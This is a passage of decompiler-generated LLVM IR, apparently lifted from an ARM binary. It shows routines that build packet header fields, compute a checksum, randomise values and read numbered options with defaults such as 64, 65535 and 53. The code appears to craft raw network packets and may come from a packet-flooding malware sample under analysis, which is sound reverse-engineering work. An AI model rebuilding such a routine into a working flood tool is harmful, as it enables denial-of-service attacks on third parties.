  %v3_bf50 = urem i32 %v3_bf38, 65536
  store i32 %v3_bf50, i32* %r2.global-to-local, align 4
  %v1_bf54 = trunc i32 %v5_bf4c to i16
  %v2_bf54 = load i32, i32* @lr, align 4
  %v3_bf54 = add i32 %v2_bf54, 2
  %v4_bf54 = inttoptr i32 %v3_bf54 to i16*
  store i16 %v1_bf54, i16* %v4_bf54, align 2
  %v0_bf58 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf58 = mul i32 %v0_bf58, 65536
  %v3_bf60 = add i32 %v1_bf58, 786432
  store i32 %v3_bf60, i32* %r2.global-to-local, align 4
  store i32 %v1_bdf0, i32* %ip.global-to-local, align 4
  %v2_bf68 = load i32, i32* @lr, align 4
  %v3_bf68 = add i32 %v2_bf68, 8
  %v4_bf68 = inttoptr i32 %v3_bf68 to i8*
  store i8 %v1_bf68, i8* %v4_bf68, align 1
  %v0_bf6c = load i32, i32* %r2.global-to-local, align 4
  %v3_bf6c = udiv i32 %v0_bf6c, 256
  %v1_bf70 = and i32 %v3_bf6c, 65280
  %v0_bf74 = load i32, i32* %ip.global-to-local, align 4
  %v2_bf74 = icmp eq i32 %v0_bf74, 0
  store i1 %v2_bf74, i1* %cpsr_z.global-to-local, align 1
  %v4_bf78 = udiv i32 %v0_bf6c, 16777216
  %v5_bf78 = or i32 %v1_bf70, %v4_bf78
  store i32 %v5_bf78, i32* %ip.global-to-local, align 4
  %v2_bf80 = load i32, i32* @lr, align 4
  %v3_bf80 = add i32 %v2_bf80, 9
  %v4_bf80 = inttoptr i32 %v3_bf80 to i8*
  store i8 17, i8* %v4_bf80, align 1
  store i32 ptrtoint (i32* @global_var_20a4c.46 to i32), i32* %r3.global-to-local, align 4
  %v0_bf88 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bf88, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bee4
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_bf8c = load i32, i32* @lr, align 4
  %v4_bf8c = add i32 %v3_bf8c, 6
  %v5_bf8c = inttoptr i32 %v4_bf8c to i16*
  store i16 64, i16* %v5_bf8c, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bee4, %bb
  %v2_bf90 = load i32, i32* @global_var_20a4c.46, align 4
  %v1_bf94 = load i32, i32* @lr, align 4
  %v2_bf94 = add i32 %v1_bf94, 12
  %v3_bf94 = inttoptr i32 %v2_bf94 to i32*
  store i32 %v2_bf90, i32* %v3_bf94, align 4
  store i32 %v2_bf00, i32* %r2.global-to-local, align 4
  %v1_bf9c = add i32 %v2_bf00, 16
  %v2_bf9c = inttoptr i32 %v1_bf9c to i32*
  %v3_bf9c = load i32, i32* %v2_bf9c, align 4
  %v1_bfa0 = load i32, i32* @lr, align 4
  %v2_bfa0 = add i32 %v1_bfa0, 16
  %v3_bfa0 = inttoptr i32 %v2_bfa0 to i32*
  store i32 %v3_bf9c, i32* %v3_bfa0, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_bfa8 = load i32, i32* @lr, align 4
  %v1_bfa8 = add i32 %v0_bfa8, 20
  store i32 %v1_bfa8, i32* %r4.global-to-local, align 4
  %v2_bfac = add i32 %v0_bfa8, 28
  %v3_bfac = inttoptr i32 %v2_bfac to i32*
  store i32 -1, i32* %v3_bfac, align 4
  %v0_bfb0 = load i32, i32* @r5, align 4
  %v1_bfb0 = trunc i32 %v0_bfb0 to i16
  %v2_bfb0 = load i32, i32* @lr, align 4
  %v3_bfb0 = add i32 %v2_bfb0, 4
  %v4_bfb0 = inttoptr i32 %v3_bfb0 to i16*
  store i16 %v1_bfb0, i16* %v4_bfb0, align 2
  %v0_bfb4 = load i32, i32* @lr, align 4
  %v1_bfb4 = add i32 %v0_bfb4, 32
  %v0_bfb8 = load i32, i32* %ip.global-to-local, align 4
  %v1_bfb8 = trunc i32 %v0_bfb8 to i16
  %v2_bfb8 = load i32, i32* %r4.global-to-local, align 4
  %v3_bfb8 = add i32 %v2_bfb8, 4
  %v4_bfb8 = inttoptr i32 %v3_bfb8 to i16*
  store i16 %v1_bfb8, i16* %v4_bfb8, align 2
  %v0_bfbc = load i32, i32* @r7, align 4
  %v1_bfbc = trunc i32 %v0_bfbc to i16
  %v2_bfbc = load i32, i32* %r4.global-to-local, align 4
  %v3_bfbc = add i32 %v2_bfbc, 2
  %v4_bfbc = inttoptr i32 %v3_bfbc to i16*
  store i16 %v1_bfbc, i16* %v4_bfbc, align 2
  %v0_bfc0 = load i32, i32* @r6, align 4
  %v1_bfc0 = trunc i32 %v0_bfc0 to i16
  %v2_bfc0 = load i32, i32* @lr, align 4
  %v3_bfc0 = add i32 %v2_bfc0, 20
  %v4_bfc0 = inttoptr i32 %v3_bfc0 to i16*
  store i16 %v1_bfc0, i16* %v4_bfc0, align 2
  %v3_bfc4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_bfc4, i32* %r2.global-to-local, align 4
  %v3_bfc8 = call i32 @function_10388(i32 %v1_bfb4, i32 %v3_be3c, i32 %v3_bfc4)
  %v3_bfcc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bfcc, i32* %r3.global-to-local, align 4
  %v1_bfd0 = add i32 %v3_bfcc, 1
  store i32 %v1_bfd0, i32* @r4, align 4
  %v1_bfd4 = load i32, i32* @r8, align 4
  %v9_bfd4 = icmp eq i32 %v1_bfd0, %v1_bfd4
  store i1 %v9_bfd4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bfd0, i32* %stack_var_-44, align 4
  %v5_bfdc = icmp slt i32 %v1_bfd0, %v1_bfd4
  br i1 %v5_bfdc, label %dec_label_pc_bee4, label %dec_label_pc_bfe0.preheader

dec_label_pc_bfe0.preheader:                      ; preds = %.thread, %dec_label_pc_be88
  %v0_bfe4.ph = phi i32 [ 0, %dec_label_pc_be88 ], [ %v1_bfd4, %.thread ]
  %v3_c020 = icmp eq i32 %v3_be98, 65535
  br label %dec_label_pc_bfe0

dec_label_pc_bfe0:                                ; preds = %dec_label_pc_bfe0, %dec_label_pc_c0cc, %dec_label_pc_bfe0.preheader
  %v0_bfe4 = phi i32 [ %v0_bfe4.ph, %dec_label_pc_bfe0.preheader ], [ 0, %dec_label_pc_c0cc ], [ 0, %dec_label_pc_bfe0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bfe4 = icmp eq i32 %v0_bfe4, 0
  store i1 %v2_bfe4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bfe4, label %dec_label_pc_bfe0, label %dec_label_pc_bff0

dec_label_pc_bff0:                                ; preds = %dec_label_pc_bfe0, %dec_label_pc_c0cc
  br label %dec_label_pc_bff4

dec_label_pc_bff4:                                ; preds = %dec_label_pc_c040, %dec_label_pc_bff0
  %v1_c004 = phi i32 [ %v1_c0bc, %dec_label_pc_c040 ], [ 0, %dec_label_pc_bff0 ]
  %v5_bff8 = mul i32 %v1_c004, 24
  %v1_bffc = load i32, i32* @sl, align 4
  %v2_bffc = add i32 %v1_bffc, %v5_bff8
  store i32 %v2_bffc, i32* %r3.global-to-local, align 4
  %v1_c000 = add i32 %v2_bffc, 20
  %v2_c000 = inttoptr i32 %v1_c000 to i8*
  %v3_c000 = load i8, i8* %v2_c000, align 1
  %v4_c000 = zext i8 %v3_c000 to i32
  store i32 %v4_c000, i32* %r2.global-to-local, align 4
  %v0_c004 = load i32, i32* @fp, align 4
  %v4_c004 = mul i32 %v1_c004, 4
  %v5_c004 = add i32 %v0_c004, %v4_c004
  %v6_c004 = inttoptr i32 %v5_c004 to i32*
  %v7_c004 = load i32, i32* %v6_c004, align 4
  store i32 %v7_c004, i32* @r5, align 4
  %v7_c00c = icmp eq i8 %v3_c000, 31
  store i1 %v7_c00c, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_c014 = add i32 %v7_c004, 20
  store i32 %v1_c014, i32* @r6, align 4
  %tmp39 = icmp ult i8 %v3_c000, 32
  br i1 %tmp39, label %dec_label_pc_c0e0, label %dec_label_pc_c01c

dec_label_pc_c01c:                                ; preds = %dec_label_pc_bff4
  store i32 %v3_be98, i32* %r3.global-to-local, align 4
  store i1 %v3_c020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c020, label %dec_label_pc_c140, label %dec_label_pc_c028

dec_label_pc_c028:                                ; preds = %dec_label_pc_c0e0, %dec_label_pc_c01c
  %v1_c02c = phi i32 [ %v1_c138, %dec_label_pc_c0e0 ], [ 65535, %dec_label_pc_c01c ]
  store i32 %v3_be9c, i32* %ip.global-to-local, align 4
  %v9_c02c = icmp eq i32 %v3_be9c, %v1_c02c
  store i1 %v9_c02c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c02c, label %dec_label_pc_c154, label %dec_label_pc_c034

dec_label_pc_c034:                                ; preds = %dec_label_pc_c140.dec_label_pc_c034_crit_edge, %dec_label_pc_c028
  %v1_c038 = phi i32 [ %v1_c038.pre, %dec_label_pc_c140.dec_label_pc_c034_crit_edge ], [ %v1_c02c, %dec_label_pc_c028 ]
  %v9_c038 = icmp eq i32 %v3_bea0, %v1_c038
  store i1 %v9_c038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c038, label %dec_label_pc_c168, label %dec_label_pc_c040

dec_label_pc_c040:                                ; preds = %dec_label_pc_c154, %dec_label_pc_c034, %dec_label_pc_c168
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c044 = load i32, i32* @r5, align 4
  %v3_c044 = add i32 %v2_c044, 10
  %v4_c044 = inttoptr i32 %v3_c044 to i16*
  store i16 0, i16* %v4_c044, align 2
  %v0_c04c = load i32, i32* @r5, align 4
  store i32 %v0_c04c, i32* @r0, align 4
  %v2_c050 = call i32 @function_c848(i32 %v0_c04c, i32 20)
  %v3_c050 = trunc i32 %v2_c050 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c058 = load i32, i32* @r5, align 4
  %v4_c058 = add i32 %v3_c058, 10
  %v5_c058 = inttoptr i32 %v4_c058 to i16*
  store i16 %v3_c050, i16* %v5_c058, align 2
  %v0_c05c = load i32, i32* %r3.global-to-local, align 4
  %v1_c05c = trunc i32 %v0_c05c to i16
  %v2_c05c = load i32, i32* @r6, align 4
  %v3_c05c = add i32 %v2_c05c, 6
  %v4_c05c = inttoptr i32 %v3_c05c to i16*
  store i16 %v1_c05c, i16* %v4_c05c, align 2
  %v3_c060 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c060, i32* %r3.global-to-local, align 4
  %v0_c064 = load i32, i32* @r6, align 4
  store i32 %v0_c064, i32* @r1, align 4
  %v1_c068 = add i32 %v0_c064, 4
  %v2_c068 = inttoptr i32 %v1_c068 to i16*
  %v3_c068 = load i16, i16* %v2_c068, align 2
  %v4_c068 = zext i16 %v3_c068 to i32
  store i32 %v4_c068, i32* %r2.global-to-local, align 4
  %v1_c06c = add i32 %v3_c060, 12
  store i32 %v1_c06c, i32* %r3.global-to-local, align 4
  %v0_c070 = load i32, i32* @r5, align 4
  %v4_c074 = call i32 @function_c898(i32 %v0_c070, i32 %v0_c064, i32 %v4_c068, i32 %v1_c06c)
  %v5_c074 = trunc i32 %v4_c074 to i16
  %v3_c078 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c078, i32* %r3.global-to-local, align 4
  %v3_c07c = mul i32 %v3_c078, 32
  store i32 %v3_c07c, i32* %lr.global-to-local, align 4
  %v3_c080 = load i32, i32* @r6, align 4
  %v4_c080 = add i32 %v3_c080, 6
  %v5_c080 = inttoptr i32 %v4_c080 to i16*
  store i16 %v5_c074, i16* %v5_c080, align 2
  %v0_c084 = load i32, i32* %lr.global-to-local, align 4
  %v1_c084 = load i32, i32* %r3.global-to-local, align 4
  %tmp40 = mul i32 %v1_c084, -8
  %v5_c084 = add i32 %v0_c084, %tmp40
  store i32 %v5_c084, i32* %lr.global-to-local, align 4
  %v0_c088 = load i32, i32* @r6, align 4
  %v1_c088 = add i32 %v0_c088, 2
  %v2_c088 = inttoptr i32 %v1_c088 to i16*
  %v3_c088 = load i16, i16* %v2_c088, align 2
  %v3_c08c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c08c, i32* %r2.global-to-local, align 4
  %v1_c090 = load i32, i32* @sl, align 4
  %v2_c090 = add i32 %v1_c090, %v5_c084
  store i32 %v2_c090, i32* @lr, align 4
  %v3_c094 = add i32 %v2_c090, 2
  %v4_c094 = inttoptr i32 %v3_c094 to i16*
  store i16 %v3_c088, i16* %v4_c094, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c0a0 = load i32, i32* @r5, align 4
  %v0_c0a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0a4 = add i32 %v0_c0a4, 32
  store i32 %v1_c0a4, i32* %r2.global-to-local, align 4
  %v0_c0a8 = load i32, i32* @sb, align 4
  %v0_c0ac = load i32, i32* @lr, align 4
  %v6_c0b4 = call i32 @function_11560(i32 %v0_c0a8, i32 %v0_c0a0, i32 %v1_c0a4, i32 16384, i32 %v0_c0ac, i32 16)
  %v3_c0b8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0b8, i32* %r3.global-to-local, align 4
  %v1_c0bc = add i32 %v3_c0b8, 1
  %v1_c0c0 = load i32, i32* @r8, align 4
  %v9_c0c0 = icmp eq i32 %v1_c0bc, %v1_c0c0
  store i1 %v9_c0c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c0bc, i32* %stack_var_-44, align 4
  %v5_c0c8 = icmp slt i32 %v1_c0bc, %v1_c0c0
  br i1 %v5_c0c8, label %dec_label_pc_bff4, label %dec_label_pc_c0cc

dec_label_pc_c0cc:                                ; preds = %dec_label_pc_c040
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c0d0 = icmp eq i32 %v1_c0c0, 0
  store i1 %v2_c0d0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c0d0, label %dec_label_pc_bfe0, label %dec_label_pc_bff0

dec_label_pc_c0e0:                                ; preds = %dec_label_pc_bff4
  %v1_c0e0 = add i32 %v2_bffc, 16
  %v2_c0e0 = inttoptr i32 %v1_c0e0 to i32*
  %v3_c0e0 = load i32, i32* %v2_c0e0, align 4
  store i32 %v3_c0e0, i32* @r4, align 4
  %v0_c0e4 = call i32 @function_e0b4()
  %v3_c0e8 = load i32, i32* %stack_var_-44, align 4
  %v5_c0f0 = mul i32 %v3_c0e8, 24
  %v0_c0f4 = load i32, i32* @r4, align 4
  %v1_c0f4 = and i32 %v0_c0f4, 16711680
  store i32 %v1_c0f4, i32* %ip.global-to-local, align 4
  %v3_c0f8 = udiv i32 %v0_c0f4, 16777216
  %v4_c0fc = udiv i32 %v1_c0f4, 256
  %v5_c0fc = or i32 %v4_c0fc, %v3_c0f8
  store i32 %v5_c0fc, i32* %r2.global-to-local, align 4
  %v1_c100 = load i32, i32* @sl, align 4
  %v2_c100 = add i32 %v1_c100, %v5_c0f0
  %v1_c104 = and i32 %v0_c0f4, 65280
  store i32 %v1_c104, i32* %r3.global-to-local, align 4
  %v1_c108 = add i32 %v2_c100, 20
  %v2_c108 = inttoptr i32 %v1_c108 to i8*
  %v3_c108 = load i8, i8* %v2_c108, align 1
  %v4_c108 = zext i8 %v3_c108 to i32
  store i32 %v4_c108, i32* %ip.global-to-local, align 4
  %v5_c110 = call i32 @llvm.bswap.i32(i32 %v0_c0f4)
  %v7_c114 = lshr i32 %v0_c0e4, %v4_c108
  %v8_c114 = add i32 %v7_c114, %v5_c110
  store i32 %v8_c114, i32* %r2.global-to-local, align 4
  %v5_c12c = call i32 @llvm.bswap.i32(i32 %v8_c114)
  %v1_c130 = load i32, i32* @r5, align 4
  %v2_c130 = add i32 %v1_c130, 16
  %v3_c130 = inttoptr i32 %v2_c130 to i32*
  store i32 %v5_c12c, i32* %v3_c130, align 4
  store i32 %v3_be98, i32* %r3.global-to-local, align 4
  %v1_c138 = load i32, i32* @r7, align 4
  %v9_c138 = icmp eq i32 %v3_be98, %v1_c138
  store i1 %v9_c138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c138, label %dec_label_pc_c140, label %dec_label_pc_c028

dec_label_pc_c140:                                ; preds = %dec_label_pc_c0e0, %dec_label_pc_c01c
  %v0_c140 = call i32 @function_e0b4()
  %v1_c140 = trunc i32 %v0_c140 to i16
  store i32 %v3_be9c, i32* %ip.global-to-local, align 4
  %v1_c148 = load i32, i32* @r7, align 4
  %v9_c148 = icmp eq i32 %v3_be9c, %v1_c148
  store i1 %v9_c148, i1* %cpsr_z.global-to-local, align 1
  %v3_c14c = load i32, i32* @r5, align 4
  %v4_c14c = add i32 %v3_c14c, 4
  %v5_c14c = inttoptr i32 %v4_c14c to i16*
  store i16 %v1_c140, i16* %v5_c14c, align 2
  br i1 %v9_c148, label %dec_label_pc_c154, label %dec_label_pc_c140.dec_label_pc_c034_crit_edge

dec_label_pc_c140.dec_label_pc_c034_crit_edge:    ; preds = %dec_label_pc_c140
  %v1_c038.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_c034

dec_label_pc_c154:                                ; preds = %dec_label_pc_c140, %dec_label_pc_c028
  %v0_c154 = call i32 @function_e0b4()
  %v1_c154 = trunc i32 %v0_c154 to i16
  %v1_c15c = load i32, i32* @r7, align 4
  %v9_c15c = icmp eq i32 %v3_bea0, %v1_c15c
  store i1 %v9_c15c, i1* %cpsr_z.global-to-local, align 1
  %v3_c160 = load i32, i32* @r5, align 4
  %v4_c160 = add i32 %v3_c160, 20
  %v5_c160 = inttoptr i32 %v4_c160 to i16*
  store i16 %v1_c154, i16* %v5_c160, align 2
  br i1 %v9_c15c, label %dec_label_pc_c168, label %dec_label_pc_c040

dec_label_pc_c168:                                ; preds = %dec_label_pc_c154, %dec_label_pc_c034
  %v0_c168 = call i32 @function_e0b4()
  %v1_c168 = trunc i32 %v0_c168 to i16
  %v3_c16c = load i32, i32* @r6, align 4
  %v4_c16c = add i32 %v3_c16c, 2
  %v5_c16c = inttoptr i32 %v4_c16c to i16*
  store i16 %v1_c168, i16* %v5_c16c, align 2
  br label %dec_label_pc_c040

dec_label_pc_c174:                                ; preds = %dec_label_pc_be60
  %v0_c174 = load i32, i32* @sb, align 4
  %v1_c178 = call i32 @function_10dd8(i32 %v0_c174)
  br label %dec_label_pc_c17c

dec_label_pc_c17c:                                ; preds = %dec_label_pc_bd54, %dec_label_pc_c174
  %v1_c184 = phi i32 [ %v3_be50, %dec_label_pc_bd54 ], [ %v1_c178, %dec_label_pc_c174 ]
  store i32 %v3_bd54, i32* %r4.global-to-local, align 4
  store i32 %v27_bd54, i32* %lr.global-to-local, align 4
  ret i32 %v1_c184

; uselistorder directives
  uselistorder i32 %v1_c138, { 1, 0 }
  uselistorder i32 %v0_c0f4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c0bc, { 2, 0, 3, 1 }
  uselistorder i32 %v5_c084, { 1, 0 }
  uselistorder i1 %v3_c020, { 1, 0 }
  uselistorder i32 %v1_bfd0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_bf38, { 1, 0 }
  uselistorder i32 %v3_bed0, { 1, 0 }
  uselistorder i32 %v3_becc, { 1, 0 }
  uselistorder i32 %v0_be90, { 1, 0, 3, 2 }
  uselistorder i32 %v0_be8c, { 1, 0, 2 }
  uselistorder i32 %v0_be88, { 1, 0, 3, 2 }
  uselistorder i1 %v7_be80, { 1, 0 }
  uselistorder i1 %v7_be54, { 1, 0 }
  uselistorder i32 %v3_be50, { 1, 2, 3, 0 }
  uselistorder i32 %v1_bdf0, { 1, 2, 0 }
  uselistorder i32 %v5_bde4, { 1, 0 }
  uselistorder i32 %v6_bd88, { 1, 2, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c17c, { 1, 0 }
  uselistorder label %dec_label_pc_c040, { 2, 0, 1 }
  uselistorder label %dec_label_pc_bff0, { 1, 0 }
  uselistorder label %dec_label_pc_bfe0, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c18c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c18c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_c18c = load i32, i32* @sb, align 4
  %v27_c18c = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_c1ac = call i32 @function_1214c(i32 %arg1, i32 4)
  %v0_c1b0 = load i32, i32* @r5, align 4
  store i32 %v0_c1b0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_c1bc = load i32, i32* @r4, align 4
  store i32 %v0_c1bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_c1c4 = inttoptr i32 %v0_c1b0 to i32*
  %v6_c1c4 = call i32 @function_8570(i32 %v0_c1bc, i32* %v5_c1c4, i32 2, i32 0, i32 %v2_c1ac)
  %v1_c1d0 = urem i32 %v6_c1c4, 256
  store i32 %v1_c1d0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c1dc = load i32, i32* @r4, align 4
  store i32 %v0_c1dc, i32* %r0.global-to-local, align 4
  %v0_c1e0 = load i32, i32* @r5, align 4
  store i32 %v0_c1e0, i32* %r1.global-to-local, align 4
  %sext22 = mul i32 %v6_c1c4, 16777216
  %v5_c1e8 = sdiv i32 %sext22, 16777216
  %v6_c1e8 = inttoptr i32 %v0_c1e0 to i32*
  %v7_c1e8 = call i32 @function_8570(i32 %v0_c1dc, i32* %v6_c1e8, i32 3, i32 65535, i32 %v5_c1e8)
  %v0_c1ec = load i32, i32* @r5, align 4
  store i32 %v0_c1ec, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_c1f8 = load i32, i32* @r4, align 4
  store i32 %v0_c1f8, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_c200 = inttoptr i32 %v0_c1ec to i32*
  %v6_c200 = call i32 @function_8570(i32 %v0_c1f8, i32* %v5_c200, i32 4, i32 64, i32 %v7_c1e8)
  %v1_c208 = urem i32 %v6_c200, 256
  store i32 %v1_c208, i32* %ip.global-to-local, align 4
  %v0_c20c = load i32, i32* @r5, align 4
  store i32 %v0_c20c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c218 = load i32, i32* @r4, align 4
  store i32 %v0_c218, i32* %r0.global-to-local, align 4
  %sext23 = mul i32 %v6_c200, 16777216
  %v5_c220 = sdiv i32 %sext23, 16777216
  %v6_c220 = inttoptr i32 %v0_c20c to i32*
  %v7_c220 = call i32 @function_8570(i32 %v0_c218, i32* %v6_c220, i32 5, i32 0, i32 %v5_c220)
  %v1_c22c = urem i32 %v7_c220, 256
  store i32 %v1_c22c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c238 = load i32, i32* @r4, align 4
  store i32 %v0_c238, i32* %r0.global-to-local, align 4
  %v0_c23c = load i32, i32* @r5, align 4
  store i32 %v0_c23c, i32* %r1.global-to-local, align 4
  %v5_c244 = inttoptr i32 %v0_c23c to i32*
  %v6_c244 = call i32 @function_8570(i32 %v0_c238, i32* %v5_c244, i32 6, i32 65535, i32 %v1_c22c)
  %v0_c248 = load i32, i32* @r5, align 4
  store i32 %v0_c248, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c254 = load i32, i32* @r4, align 4
  store i32 %v0_c254, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_c25c = inttoptr i32 %v0_c248 to i32*
  %v6_c25c = call i32 @function_8570(i32 %v0_c254, i32* %v5_c25c, i32 7, i32 53, i32 %v6_c244)
  %v0_c268 = load i32, i32* @r5, align 4
  store i32 %v0_c268, i32* %r1.global-to-local, align 4
  %v0_c26c = load i32, i32* @r4, align 4
  store i32 %v0_c26c, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_c278 = inttoptr i32 %v0_c268 to i32*
  %v6_c278 = call i32 @function_8570(i32 %v0_c26c, i32* %v5_c278, i32 9, i32 65535, i32 %v6_c25c)
  %v0_c27c = load i32, i32* @r5, align 4
  store i32 %v0_c27c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_c288 = load i32, i32* @r4, align 4
  store i32 %v0_c288, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_c290 = inttoptr i32 %v0_c27c to i32*
  %v6_c290 = call i32 @function_8570(i32 %v0_c288, i32* %v5_c290, i32 0, i32 12, i32 %v6_c278)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c29c = load i32, i32* @r5, align 4
  store i32 %v0_c29c, i32* %r1.global-to-local, align 4
  store i32 %v6_c290, i32* %sb.global-to-local, align 4
  %v0_c2a4 = load i32, i32* @r4, align 4
  store i32 %v0_c2a4, i32* %r0.global-to-local, align 4
  %v4_c2a8 = inttoptr i32 %v0_c29c to i32*
  %v5_c2a8 = call i32 @function_8190(i32 %v0_c2a4, i32* %v4_c2a8, i32 8, i32 0)
  store i32 %v5_c2a8, i32* @r7, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_c2b4 = call i32 @function_fd60(i32 24)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_c2c0 = call i32 @function_fc9c(i32 24, i32* null)
  store i32 %v3_c2c0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_c2c8 = call i32 @function_109e4(i32 %v3_c2c0, i32 0)
  store i32 %v2_c2c8, i32* @r4, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_c2d4 = call i32 @function_fcc0(i32 24)
  store i32 %v1_c2d4, i32* %r0.global-to-local, align 4
  %v0_c2d8 = load i32, i32* @r4, align 4
  %v1_c2d8 = icmp slt i32 %v0_c2d8, 0
  %v2_c2d8 = icmp eq i32 %v0_c2d8, 0
  store i1 %v2_c2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_c2d8, label %dec_label_pc_c7d0, label %dec_label_pc_c2e0

dec_label_pc_c2e0:                                ; preds = %dec_label_pc_c18c
  %v2_c2e4 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_c2e4, i32* @sl, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_c2e4, i32* %r1.global-to-local, align 4
  store i32 %v0_c2d8, i32* %r0.global-to-local, align 4
  %v1_c2f4 = call i32 @function_10b70(i32 %v0_c2d8)
  store i32 %v1_c2f4, i32* @r5, align 4
  %v0_c2fc = load i32, i32* @r4, align 4
  store i32 %v0_c2fc, i32* %r0.global-to-local, align 4
  %v1_c300 = call i32 @function_10dd8(i32 %v0_c2fc)
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_c308 = call i32 @function_fd60(i32 25)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_c314 = call i32 @function_fc9c(i32 25, i32* null)
  %v0_c318 = load i32, i32* @r5, align 4
  store i32 %v0_c318, i32* @r1, align 4
  store i32 %v3_c314, i32* %r2.global-to-local, align 4
  store i32 %v2_c2e4, i32* %r0.global-to-local, align 4
  %v3_c324 = bitcast i32* %stack_var_-2124 to i8*
  %v4_c324 = call i32 @function_10668(i8* %v3_c324, i32 %v0_c318, i32 %v3_c314)
  store i32 %v4_c324, i32* @r6, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_c330 = call i32 @function_fcc0(i32 25)
  store i32 %v1_c330, i32* %r0.global-to-local, align 4
  %v0_c334 = load i32, i32* @r6, align 4
  %v7_c334 = icmp eq i32 %v0_c334, -1
